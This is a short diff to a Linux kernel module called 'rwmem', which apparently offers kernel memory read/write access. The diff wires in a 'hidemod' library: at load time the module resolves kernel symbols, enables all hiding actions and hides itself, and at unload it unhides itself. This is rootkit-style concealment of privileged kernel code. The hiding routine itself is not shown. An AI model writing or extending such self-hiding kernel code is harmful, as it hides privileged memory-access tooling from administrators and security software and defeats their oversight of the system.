@@ -9,6 +9,7 @@
 
 #include "core.h"
 #include "type_info.h"
+#include "hidemod.h"
 #include "rwmem_sc.h"
 #include "rwmem.h"
 
@@ -40,12 +41,18 @@ static int __init rwmem_init(void)
 	if (ret)
 		return ret;
 
+	hm_init(&(struct hm_resolver){ .name_to_addr = kr_name_to_addr });
+	hm_set_actions(HM_ACT_ALL);
+	hm_add_module(THIS_MODULE, NULL);
+
 	pr_info("[rwmem] loaded\n");
 	return 0;
 }
 
 static void __exit rwmem_exit(void)
 {
+	hm_unhide();
+	hm_exit();
 	rwmem_sc_exit();
 	ti_exit();
 	pr_info("[rwmem] unloaded\n");
